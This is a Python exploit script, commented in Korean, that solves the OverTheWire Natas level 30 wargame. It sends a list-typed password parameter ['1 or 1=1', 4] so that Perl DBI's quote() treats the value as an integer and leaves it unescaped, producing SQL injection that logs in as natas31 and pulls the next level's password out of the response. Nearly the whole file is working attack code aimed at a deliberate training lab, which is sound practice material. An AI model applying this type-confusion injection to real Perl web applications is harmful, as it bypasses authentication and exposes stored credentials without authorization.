import requests
import sys
import re

boundary = "=" * 65

if len(sys.argv) != 2:
  print(boundary)
  print("[-] 아래 모펫을 실행하세요")
  print(f"   python {sys.argv[0]} [나타스30 비밀번호]")
  sys.exit()
  print(boundary)
  
url = "http://natas30.natas.labs.overthewire.org/index.pl"
natas30_cred = sys.argv[1]

s = requests.Session()
s.auth = ("natas30", natas30_cred)

# 인자로 전달 시, 실제 리스트 형태로 전달해야 1 or 1=1이 전달되고 타입 지정자가 4를 받으며 int형으로 바꿈
# int형이 되버리면서 1 or 1=1에 이스케이프 문자 및 '로 감싸지 않아 그대로 1 or 1=1을 반환  
payload = ["1 or 1=1", 4]
data = {"username" : "natas31", "password": payload}

response = s.post(url, data=data)
# 비밀번호가 natas31 앞에 바로 비밀번호가 붙기 때문에, 아래처럼 검색
password = re.search(r"natas31([a-zA-Z0-9]{32})", response.text)

if password:
  print(boundary)
  print(f"[+] natas31의 비밀번호 ===> {password.group(1)}")
  print(boundary)
else:
  print(boundary)
  print(f"[-] 페이로드 문제나 비밀번호 못 찾았으니 응답 전체를 보세요")
  print(response.text)
  print(boundary)  
  
